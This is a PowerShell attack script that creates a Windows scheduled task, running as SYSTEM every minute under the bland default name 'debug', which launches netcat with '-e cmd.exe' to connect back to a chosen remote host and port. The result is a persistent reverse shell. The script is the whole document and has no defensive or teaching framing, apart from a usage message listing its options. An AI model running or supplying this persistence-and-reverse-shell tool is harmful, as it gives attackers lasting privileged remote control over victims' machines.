param(
    [string]$Path = "nc64.exe",
    
    [Alias("r")]
    [string]$RH = "127.0.0.1",

    [Alias("p")]
    [int]$Port = 1111,

    [Alias("tn")]
    [string]$TaskName = "debug",

    [Alias("t")]
    [int]$Timeout = 1,

    [Alias("e")]
    [string]$Command = "cmd.exe",

    [switch]$Help
)

if ($Help) {
    Write-Host "Usage: script.ps1 [-Path <path_to_nc>] [-r <rhost_ip>] [-p <port_number>] [-tn <task_name>] [-t <minutes>] [-e <command>] [-Help]"
    Write-Host "       -Path: Path to Netcat executable. Default is 'nc64.exe'."
    Write-Host "       -r: Remote host IP address or domain. Default is '127.0.0.1'."
    Write-Host "       -p: Port number. Default is '1111'."
    Write-Host "       -tn: Name of the scheduled task. Default is 'debug'."
    Write-Host "       -t: Frequency of the task in minutes. Default is '1'."
    Write-Host "       -e: Command to execute. Default is 'cmd.exe'."
    Write-Host "       -Help: Display this help message."
    exit
}

$trCommand = "$Path -e $Command $RH $Port"
$schtasksCommand = "schtasks /create /sc minute /mo $Timeout /tn $TaskName /tr `"$trCommand`" /ru SYSTEM"

Invoke-Expression $schtasksCommand

Write-Host "Scheduled task created: $TaskName"
Write-Host "Command executed: $schtasksCommand"

